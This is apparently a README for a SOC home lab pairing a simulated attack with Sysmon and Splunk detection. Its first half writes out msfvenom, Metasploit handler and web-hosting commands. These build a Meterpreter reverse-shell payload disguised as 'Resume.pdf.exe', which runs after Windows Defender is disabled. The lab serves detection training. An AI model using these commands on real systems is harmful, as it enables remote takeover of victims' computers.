# Simple Malware Analysis – SOC Home Lab

## Overview
This document explains the execution phase of the SOC home lab using **Kali Linux** and **Windows 10 Pro**.  
The goal is to simulate an attack–defense scenario where we:
- Perform reconnaissance and exploitation from Kali.
- Deliver and execute malware on Windows.
- Monitor and investigate events using **Sysmon + Splunk**.

A PDF file with screenshots is provided alongside this README for visual reference.

---

## Steps

### 1. Reconnaissance
- From **Kali Linux**, run an Nmap scan against the Windows target:
  ```nmap 192.168.20.10```
- Port 3389 (RDP) should appear open. NOTE: If it doesn't appear open, we need to activate Remote Desktop on our Windows machine.

### 2. Malware Creation with msfvenom
- On Kali, generate a payload:
```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe```
- LHOST = Kali IP
- LPORT = Listening port (example: 4444)

### 3. Starting Metasploit
- Launch Metasploit:
```metasploit```
- Use the multi-handler:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.20.11
set LPORT 4444
run
```

### 4. Hosting the Malware
- Start a simple web server in Kali to share the payload:
```python3 -m http.server 9999```
- Windows will later connect to Kali on port 9999 to retrieve the file.

### 5. Defender-Side Preparation
- On Windows 10 Pro (or your version of Windows), disable Windows Defender (to allow file execution).
- From the browser, navigate to:
```http://192.168.20.11:9999/Resume.pdf.exe```
- Download and execute the file (a warning will appear; proceed for the test).

### 6. Verifying the Connection
- Back in Kali, confirm the meterpreter session is opened.
- Test with some commands (sysinfo, ipconfig) to validate shell access.
- In Windows Task Manager, you should see Resume.pdf.exe running.

### 7. Splunk & Sysmon Analysis
- Open Splunk on Windows (http://localhost:8000).
- Search for Sysmon logs:
```index=endpoint```
- Look for:
  - Source IP (Kali machine).
  - Destination ports scanned/used.
  - Process events triggered by the payload (Resume.pdf.exe).
**Example Investigations**
- Check ports targeted:
```index=endpoint dest_ip=192.168.20.10 | stats count by dest_port```
- Search for the malware process:
```index=endpoint Image="*Resume.pdf.exe"```
- Filter EventCode 1 (Process Create):
```index=endpoint EventCode=1```
  - Expand logs to view Parent Process and CommandLine execution.
- Use the Process GUID to pivot and track all related child processes (e.g., malware spawning cmd.exe).

## Notes
- A PDF version of this lab with full screenshots is included in this repository for visual reference.
- Use the PDF when following along if you prefer to see exact UI examples.

## Disclaimer
- This lab is for educational purposes only.
- All testing was performed in a controlled, isolated environment.
